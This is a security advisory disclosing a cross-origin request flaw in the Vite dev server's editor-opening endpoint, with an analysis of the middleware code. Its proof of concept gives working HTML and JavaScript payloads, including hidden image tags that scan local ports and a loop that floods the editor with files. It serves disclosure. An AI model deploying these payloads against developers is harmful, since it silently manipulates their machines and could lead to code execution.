## Summary
A cross-origin side-effect CSRF vulnerability in the Vite dev server allows any website a developer visits to trigger the `/__open-in-editor` endpoint, opening arbitrary files in the developer's code editor without their consent. The `rejectNoCorsRequestMiddleware` only blocks cross-origin requests with `sec-fetch-dest: script`, leaving all other cross-origin no-cors request types (image, empty, style, etc.) unblocked. This allows a plain `<img>` tag on any malicious webpage — requiring no JavaScript — to invoke the editor-launch side effect.

## Details
The Vite dev server mounts the `launch-editor-middleware` at `/__open-in-editor` without any origin or CSRF protection:
```
// packages/vite/src/node/server/index.ts, line 973-974  
middlewares.use('/__open-in-editor', launchEditorMiddleware())
index.ts:973-974

## The `rejectNoCorsRequestMiddleware` is the only middleware designed to block cross-origin requests with side effects. However, it only blocks requests where `sec-fetch-dest === 'script'`:

// packages/vite/src/node/server/middlewares/rejectNoCorsRequest.ts, lines 22-27  
if (  
  req.headers['sec-fetch-mode'] === 'no-cors' &&  
  req.headers['sec-fetch-site'] !== 'same-origin' &&  
  // we only need to block classic script requests  
  req.headers['sec-fetch-dest'] === 'script'  
) {
rejectNoCorsRequest.ts:22-27
```
A cross-origin `<img>` tag sends `sec-fetch-dest: image` and a `fetch({mode:'no-cors'})` sends `sec-fetch-dest: empty`. Neither matches `'script'`, so the middleware calls `next()` and the request proceeds.

The remaining security middlewares also do not block the request:

1. `corsMiddleware` (line 933): The default origin allowlist is localhost/127.0.0.1/[::1]. For non-matching origins, the cors npm package omits the Access-Control-Allow-Origin header but does not block the request — it calls next(). For no-cors mode requests, the browser does not check CORS headers (the response is opaque), so the request is sent and processed regardless. index.ts:930-935
2. `hostValidationMiddleware` (line 940): The browser always sets the Host header to the target (localhost:5173), which passes validation. hostCheck.ts:46-62

The `launch-editor-middleware` package has no origin check of its own. It reads the file query parameter and spawns a child process to open the `file` in the developer's detected editor (VS Code, Sublime, vim, etc.). The side effect occurs before any response is sent back.

## PoC
**Prerequisites:**

- A Vite dev server running with default configuration (`npm create vite@latest`, then `npm run dev`)
- The developer has an editor detected by `launch-editor` (VS Code, Sublime, etc.)
- The developer visits a page containing the attack payload in any browser

**Attack (no JavaScript required):**

Create an HTML page on any domain (or embed in a forum post, email, etc.):
```
<!DOCTYPE html>  
<html>  
<body>  
  <h1>Innocent looking page</h1>  
  
  <!-- This opens /etc/passwd in the developer's editor -->  
  <img src="http://localhost:5173/__open-in-editor?file=/etc/passwd" style="display:none">  
  
  <!-- Scan multiple common Vite ports for broader coverage -->  
  <img src="http://localhost:5174/__open-in-editor?file=/etc/passwd" style="display:none">  
  <img src="http://localhost:5175/__open-in-editor?file=/etc/passwd" style="display:none">  
  <img src="http://localhost:5176/__open-in-editor?file=/etc/passwd" style="display:none">  
</body>  
</html>
```

**Attack (with JavaScript, for targeted file opening):**

```
<script>  
// Open a specific project file in the developer's editor  
fetch('http://localhost:5173/__open-in-editor?file=/etc/passwd', { mode: 'no-cors' });  
  
// Or open many files to overwhelm the editor  
for (let i = 0; i < 50; i++) {  
  fetch(`http://localhost:5173/__open-in-editor?file=/dev/urandom`, { mode: 'no-cors' });  
}  
</script>
```

**Expected result**: The developer's code editor opens the specified file(s) without any user interaction or consent. The browser console may show a failed image load or an opaque response, but the server-side side effect has already occurred.

**Request headers sent by the browser (for the `<img>` variant):**

```
GET /__open-in-editor?file=/etc/passwd HTTP/1.1  
Host: localhost:5173  
Origin: https://attacker.com  
Sec-Fetch-Dest: image  
Sec-Fetch-Mode: no-cors  
Sec-Fetch-Site: cross-site  
```

## Impact
**Type**: Cross-Site Request Forgery (CSRF) / Cross-Origin Side-Effect Attack

**Who is impacted**: Any developer running a Vite dev server with default configuration who visits a malicious or compromised webpage in the same browser.

Impact details:

- **Integrity**: A cross-origin page can modify the developer's editor state (open arbitrary files) without consent. This violates the threat model's requirement that "Missing or bypassable origin / host validation allows a cross-origin page to access dev-server endpoints that can cause confidentiality or integrity issues."
- **Potential escalation**: If the developer's editor has auto-run features (e.g., VS Code workspace trust, .vscode/tasks.json triggered on file open, or editor extensions that execute on file open), this could escalate to arbitrary code execution on the developer's machine. The escalation depends on editor configuration, not Vite itself.
- **Low barrier to exploit**: No JavaScript is required. A single `<img>` tag — embeddable in emails, forum posts, blog comments, or any website — is sufficient. The attack is silent (no visible browser behavior) and requires no user interaction beyond visiting the page.